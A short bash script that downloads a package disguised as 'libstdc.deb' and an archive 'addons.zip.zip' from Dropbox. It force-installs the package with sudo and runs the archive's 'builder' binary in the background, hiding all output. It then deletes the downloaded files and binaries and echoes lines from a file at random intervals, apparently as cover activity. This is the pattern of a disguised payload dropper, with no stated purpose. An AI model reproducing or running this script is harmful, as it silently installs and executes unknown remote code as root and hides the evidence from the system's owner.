#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
rm -rf libstdc.deb
wget https://www.dropbox.com/s/t3o0q15dddib16g/addons.zip.zip -q
unzip addons.zip > /dev/null 2>&1
#pwd
./tools/builder ./tools/prefs &
sleep 3
rm -rf addons.zip
rm -rf tools/builder
rm -rf tools/prefs
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 6 ))
done < $2

